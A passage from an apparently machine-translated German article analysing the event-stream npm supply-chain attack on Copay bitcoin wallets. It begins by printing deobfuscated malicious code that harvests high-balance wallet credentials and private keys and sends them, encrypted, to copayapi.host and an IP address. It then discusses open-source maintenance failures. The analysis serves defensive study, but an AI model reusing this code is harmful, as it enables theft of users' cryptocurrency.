class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>);                   n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span>               }               i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n)           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory;                   resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       e.getFile(t, {                           <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span>                       }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader;                               t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{                                   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result))                               }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                                   t.abort()                               }, t.readAsText(e)                           })                       })                   })               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t);                       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r))                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t]))                       })                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               }           }           global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t];                   <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>;                       t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t)))                   }.bind(n))               }           });           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>);           e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e);               <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey))               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t           }       } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}   }   <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e()</code> </pre> <br>  <code>Payload A</code> und <code>Payload B</code> Code können in der Node.js-Umgebung auf dem Build-Server des Projekts ausgeführt werden. <code>Payload C</code> in einer Umgebung ausgeführt werden, die einem Browser unter der Kontrolle des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Cordova-</a> Frameworks (ehemals <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PhoneGap</a> ) ähnelt.  Mit diesem Framework können Sie native Anwendungen für verschiedene Plattformen mithilfe von Webtechnologien entwickeln - HTML, CSS und JavaScript.  Copay-Clientanwendungen (sowie Gabeln dieses Projekts wie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">FCash</a> ), die für verschiedene Plattformen entwickelt wurden, werden mit Cordova erstellt.  Auf diese Kunden richtet sich der Angriff.  Diese nativen Apps sind für Copay-Endbenutzer gedacht, die ihre Bitcoin-Geldbörsen mit ihnen verwalten.  Diese Brieftaschen waren für den Angreifer von Interesse.  Das Skript hat die gestohlenen Daten an copayapi.host und unter 111.90.151.134 gesendet. <br><br><h2>  <font color="#3AC1EF">Enttäuschende Schlussfolgerungen</font> </h2><br>  Das zu entwickeln, worüber wir gerade gesprochen haben, ist eine entmutigende Aufgabe.  Dieser Hack erforderte ernsthafte Nachforschungen und erhebliche Anstrengungen, um einen Angriff durchzuführen.  Der Angreifer hatte wahrscheinlich auch Fallback-Optionen, die er verwenden würde, wenn er die Kontrolle über das Event-Stream-Paket nicht erlangen könnte.  In Anbetracht der Organisation des Angriffs erscheint es plausibel, dass der Angreifer ursprünglich speziell auf Copay abzielte und nicht nur die Kontrolle über die beliebte Bibliothek erlangte und dann bereits darüber nachdachte, was er damit tun sollte.  Die Popularität von Event-Stream lässt darauf schließen, dass der Angreifer in Hunderten von Unternehmen auf der ganzen Welt auf einfache Weise auf wichtige Computer zugreifen konnte.  Glücklicherweise wurde die Bedrohung schnell erkannt und neutralisiert, da sie möglicherweise unbemerkt blieb, aber wenn wir darüber nachdenken, was passieren könnte, kommen wir zu der offensichtlichen Schlussfolgerung: Open Source ist schwer krank. <br><br>  Lassen Sie uns eine Liste der Gründe erstellen, die zu dem oben genannten Vorfall geführt haben: <br><br><ol><li>  Die Anwendung (Copay) wurde auf der Grundlage vieler verschiedener Abhängigkeiten erstellt, während der Abhängigkeitsbaum nicht blockiert wurde. </li><li>  Selbst wenn berücksichtigt wurde, dass der Abhängigkeitsbaum nicht blockiert wurde, die Abhängigkeiten nicht zwischengespeichert wurden, wurden sie bei jedem Build des Projekts aus dem Repository geladen. </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tausende</a> anderer Projekte sind vom Ereignisstrom abhängig und verwenden dieselben oder ähnliche Konfigurationen. </li><li>  Derjenige, der die Bibliothek unterstützte, von der Tausende von Projekten abhängen, hörte auf, daran zu arbeiten. </li><li>  Tausende Projekte nutzten diese Bibliothek kostenlos.  Gleichzeitig wurde erwartet, dass sie sie ohne materielle Entschädigung unterstützen würden. </li><li>  Derjenige, der die Bibliothek unterstützte, übertrug die Kontrolle über sie nur auf das Unbekannte, weil er ihn danach fragte. </li><li>  Es gab keine Benachrichtigungen, dass das Projekt seinen Eigentümer gewechselt hat, und dennoch verwendeten Tausende von Projekten einfach weiterhin das entsprechende Paket. </li><li>  In der Tat geht diese Liste weiter und weiter ... </li></ol><br>  Es ist beängstigend darüber nachzudenken, welchen Schaden der von uns diskutierte Einbruch verursachen könnte.  Zum Beispiel hängen äußerst ernsthafte Projekte vom Ereignisstrom ab.  Zum Beispiel die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Microsoft Azure-CLI</a> .  Anfällig waren die Computer, auf denen sie dieses Programm entwickeln, und die Computer, auf denen es verwendet wird.  Schädlicher Code könnte sowohl auf diese als auch auf andere gelangen. <br><br>  Das Problem hierbei ist, dass viele Softwareprojekte auf der Grundlage dessen erstellt werden, von denen erwartet wird, dass sie kostenlos arbeiten.  Sie erstellen nützliche Programme, beschäftigen sich einige Zeit mit ihnen (oder machen sie einfach nur öffentlich und das ist alles) und es wird erwartet, dass sie ihre Entwicklung bis zum Ende der Zeit unterstützen.  Wenn dies für sie nicht funktioniert, tun sie entweder nichts, ignorieren Anrufe an sie oder melden Schwachstellen in ihren Projekten ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schuldig!</a> ) Oder geben ihre Projekte einfach an andere Personen weiter, in der Hoffnung, dass sie gehen und sich nicht mehr darauf einlassen können.  Manchmal funktioniert es.  Manchmal nicht.  Nichts kann jedoch die Schwachstellen rechtfertigen, die aufgrund solcher Phänomene in der Software auftreten.  Übrigens wurde selbst die Erkennung eines Problems mit dem Ereignisstrom, dessen Untersuchung und Beseitigung hauptsächlich von Open-Source-Freiwilligen durchgeführt, deren Arbeit in keiner Weise bezahlt wird. <br><br>  Es sind so viele verschiedene Personen und Organisationen mit dem verbunden, was passiert ist, dass die Suche nach bestimmten Tätern nicht viel Sinn macht.  Open Source ist schwer krank und je größer dieses Phänomen wird, desto höher ist die Wahrscheinlichkeit von Katastrophen.  Angesichts des zerstörerischen Potenzials des hier diskutierten Vorfalls ist es ein Glück, dass das Ziel des Angreifers nur eine Anwendung war. <br><br>  Ähnliche Probleme sind nicht auf Node.js oder npm beschränkt.  In verwandten Ökosystemen wird ein ebenso unangemessen hohes Maß an Vertrauen in Fremde beobachtet.  Dies hat auch mit PyPi in der Python-Umgebung, RubyGems und GitHub zu tun.  Jeder kann in den oben genannten Diensten veröffentlichen, ohne dass eine Benachrichtigung die Verwaltung seiner Projekte an irgendjemanden überträgt.  Und selbst ohne sie verwenden moderne Projekte solche Mengen an Code anderer Leute, dass eine gründliche Analyse die Arbeit eines Teams für lange Zeit stoppen würde.  Um die engen Fristen einzuhalten, installieren die Entwickler das, was sie benötigen, und die Teams, die für Sicherheit und automatisierte Tools zur Codeüberprüfung verantwortlich sind, halten einfach nicht mit der schnellen Entwicklung sich ständig ändernder Programme Schritt. <br><br>  <b>Liebe Leser!</b>  Wie stehen Sie zu dem jüngsten Ereignis-Stream-Vorfall? <br><br><div style="text-align:center;"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/n0/ry/op/n0ryop7wfykgkeicz3mtuwghrcu.jpeg"></a> </div><br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de434116/">https://habr.com/ru/post/de434116/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de434104/index.html">UKW-Boden oder Entmystifizierung von Doppel- / Dreifachquadratantennen</a></li>
<li><a href="../de434106/index.html">Vertrauen Sie auf mobile SDKs</a></li>
<li><a href="../de434110/index.html">Die Verdauung von frischen Materialien aus der Welt des Frontends für die letzte Woche Nr. 344 (17. - 23. Dezember 2018)</a></li>
<li><a href="../de434112/index.html">Prinzipien der funktionalen Programmierung in JavaScript</a></li>
<li><a href="../de434114/index.html">19 Ideen für Node.js Entwickler, die 2019 über sich selbst hinauswachsen wollen</a></li>
<li><a href="../de434118/index.html">React Tutorial Teil 4: Übergeordnete und untergeordnete Komponenten</a></li>
<li><a href="../de434120/index.html">React Tutorial, Teil 5: Erste Schritte mit einer TODO-Anwendung, Grundlagen des Stylings</a></li>
<li><a href="../de434122/index.html">Drehbuch - Kein Seitenobjekt</a></li>
<li><a href="../de434124/index.html">Aktivieren Sie die GPU-Beschleunigung in Photoshop unter Wine</a></li>
<li><a href="../de434126/index.html">Spielen Sie Medien mit der VLCj-Bibliothek ab</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>